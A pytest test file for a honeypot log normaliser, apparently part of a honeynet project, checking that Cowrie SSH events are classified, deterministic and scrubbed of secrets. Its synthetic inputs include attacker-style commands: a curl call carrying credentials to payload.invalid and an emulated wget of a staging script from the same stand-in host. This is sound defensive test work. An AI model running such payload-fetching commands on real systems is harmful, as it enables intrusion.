from pathlib import Path

from honeynet.cowrie import normalize_lines
from honeynet.models import EventType

FIXTURE = Path(__file__).parents[1] / "fixtures" / "cowrie_basic.jsonl"
INTELLIGENCE_FIXTURE = (
    Path(__file__).parents[1] / "fixtures" / "cowrie_session_intelligence.jsonl"
)
SIMULATED_TRANSFER_FIXTURE = (
    Path(__file__).parents[1] / "fixtures" / "cowrie_simulated_transfer.jsonl"
)


def test_cowrie_fixture_is_normalized_without_network_activity() -> None:
    with FIXTURE.open(encoding="utf-8") as stream:
        events = list(normalize_lines(stream))

    assert [event.event_type for event in events] == [
        EventType.CONNECTION_OPENED,
        EventType.LOGIN_ATTEMPT,
        EventType.COMMAND_INPUT,
        EventType.FILE_DOWNLOAD_REQUESTED,
        EventType.CONNECTION_CLOSED,
    ]
    assert {event.session_id for event in events} == {"cowrie-basic-001"}
    assert events[1].data == {
        "username": "demo",
        "auth_method": "password",
        "success": False,
    }
    assert events[1].source_event["password"] == "[REDACTED]"
    assert "synthetic-only" not in events[1].model_dump_json()


def test_unknown_cowrie_event_is_ignored() -> None:
    line = (
        '{"eventid":"cowrie.client.version","sensor":"pl-lab-01",'
        '"timestamp":"2026-08-19T10:00:00Z","session":"test",'
        '"src_ip":"192.0.2.1"}'
    )
    assert list(normalize_lines([line])) == []


def test_normalization_is_deterministic() -> None:
    lines = FIXTURE.read_text(encoding="utf-8").splitlines()
    first = list(normalize_lines(lines))
    second = list(normalize_lines(lines))
    assert [event.event_id for event in first] == [event.event_id for event in second]


def test_inline_secrets_are_redacted_from_commands_and_source_event() -> None:
    line = (
        '{"eventid":"cowrie.command.input","sensor":"pl-lab-01",'
        '"timestamp":"2026-08-19T10:00:00Z","session":"test",'
        '"src_ip":"192.0.2.1","input":"curl --token top-secret '
        'https://user:pass@payload.invalid/a?api_key=abc"}'
    )

    event = next(iter(normalize_lines([line])))
    serialized = event.model_dump_json()

    assert "top-secret" not in serialized
    assert "user:pass@" not in serialized
    assert "api_key=abc" not in serialized
    assert serialized.count("[REDACTED]") >= 3


def test_extended_cowrie_metadata_and_artifact_provenance_are_normalized() -> None:
    with INTELLIGENCE_FIXTURE.open(encoding="utf-8") as stream:
        events = list(normalize_lines(stream))

    fingerprints = [event for event in events if event.event_type is EventType.CLIENT_FINGERPRINT]
    assert fingerprints[0].data == {"client_version": "SSH-2.0-synthetic-client_1.0"}
    assert fingerprints[1].data["hassh"] == "00000000000000000000000000000000"
    assert fingerprints[1].data["kex_algorithms"] == ["curve25519-sha256"]

    artifact = next(event for event in events if event.event_type is EventType.ARTIFACT_CAPTURED)
    assert artifact.data == {
        "sha256": "a" * 64,
        "size_bytes": 17,
        "filename": "client.conf",
        "origin": "stdin_capture",
        "role": "config",
    }
    failed_transfer = next(
        event for event in events if event.event_type is EventType.FILE_DOWNLOAD_REQUESTED
    )
    assert failed_transfer.data["tool"] == "scp"
    assert failed_transfer.data["outcome"] == "failed"
    assert failed_transfer.data["destination_filename"] == "out"
    assert any(event.event_type is EventType.COMMAND_FAILED for event in events)


def test_direct_upload_is_classified_without_opening_the_file() -> None:
    line = (
        '{"eventid":"cowrie.session.file_upload","sensor":"pl-lab-01",'
        '"timestamp":"2026-08-26T10:00:00Z","session":"upload-test",'
        '"src_ip":"192.0.2.1","filename":"/tmp/example.sh",'
        f'"shasum":"{"b" * 64}","size":42}}'
    )

    event = next(iter(normalize_lines([line])))

    assert event.event_type is EventType.ARTIFACT_CAPTURED
    assert event.data["origin"] == "direct_upload"
    assert event.data["role"] == "script"
    assert event.data["filename"] == "example.sh"


def test_simulated_transfer_is_normalized_as_contained_intent_only() -> None:
    with SIMULATED_TRANSFER_FIXTURE.open(encoding="utf-8") as stream:
        events = list(normalize_lines(stream))

    assert len(events) == 1
    event = events[0]
    assert event.event_type is EventType.FILE_DOWNLOAD_REQUESTED
    assert event.data == {
        "url": "https://payload.invalid/stage.sh",
        "tool": "wget",
        "outcome": "emulated",
        "destination_filename": "stage.sh",
    }
    assert "placeholder_sha256" not in event.data
